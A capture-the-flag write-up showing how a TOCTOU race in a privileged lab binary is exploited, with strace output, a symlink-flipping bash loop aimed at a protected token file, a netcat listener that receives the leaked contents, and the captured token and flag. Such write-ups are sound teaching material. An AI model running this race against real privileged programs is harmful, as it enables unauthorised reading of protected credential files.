# Level 10 - Exploit a TOCTOU vulnerability

## Vulnerability

This level exploits a Time-of-Check-to-Time-of-Use (TOCTOU) race condition vulnerability.

## Discovery & Analysis

Analyzing the binary using `strace`, we see the following sequence of system calls:
```bash
access("test2", R_OK) = 0
...
write(1, "Connecting to 192.168.122.99:696"..., 37Connecting to 192.168.122.99:6969 .. ) = 37
socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3
connect(3, {sa_family=AF_INET, sin_port=htons(6969), sin_addr=inet_addr("192.168.122.99")}, 16) = 0
write(3, ".*( )*.\n", 8) = 8
write(1, "Connected!\n", 11Connected!
) = 11
write(1, "Sending file .. ", 16Sending file .. ) = 16
openat(AT_FDCWD, "test2", O_RDONLY) = 4
```
The key vulnerability is the time gap between the permission check (`access()`) and the actual file opening (`open()`). If we can switch what the filepath points to during this gap, we can read files we don't have permission to access.

## Exploitation Method

### Step 1: Create necessary files

```bash
touch /tmp/myfile
chmod 777 /tmp/myfile

nano /tmp/run.sh
```

```bash
#!/bin/bash

while true; do
  # Switch the symbolic link to /tmp/myfile
  ln -sf /tmp/myfile /tmp/linkfile

  # Run the level10 program
  /home/user/level10/level10 /tmp/linkfile 127.0.0.1

  # Switch the symbolic link to the token file
  ln -sf /home/user/level10/token /tmp/linkfile
done
```

- `ln`: Creates links between files.

- `-s`: Creates a symbolic link (symlink) instead of a hard link. A symbolic link is like a shortcut that points to another file. They are useful here because they can quickly be redirected to point to different files.
- `-f`: Force flag. If the target file already exists, remove it before creating the link. This prevents error messages about files already existing.

```bash
chmod +x /tmp/run.sh
```

### Step 2: Set up a listener and run the scripts

In three separate terminals, run:

```bash
# Terminal 1: Start a netcat listener
nc -kl 6969

# Terminal 2: Run the program repeatedly
/tmp/run.sh
```

- `nc` is the netcat utility, a versatile networking tool
- `-l` puts netcat in "listen mode", making it act as a server
- The additional `-k` flag keeps the listener running after a client disconnects
- `6969` is the port number to listen on

After running the exploit, we captured the token from the token file:

```
woupa2yuojeeaaed06riuj63c
```

We used this token to log in as flag10 user:

```bash
su flag10
# Enter the token as password
getflag
# Output: Check flag.Here is your token : feulo4b72j7edeahuete3no7c
```

## Explanation

The exploit works because:

1. When `level10` calls `access()`, our symlink points to `/tmp/myfile` which we can access
2. Before `level10` calls `open()`, our script rapidly changes the symlink to point to the token file
3. When `open()` is called, it opens the token file instead, bypassing the permission check
4. The content is sent to our netcat listener

This is a classic race condition vulnerability where the system state changes between checking permissions and performing an operation.
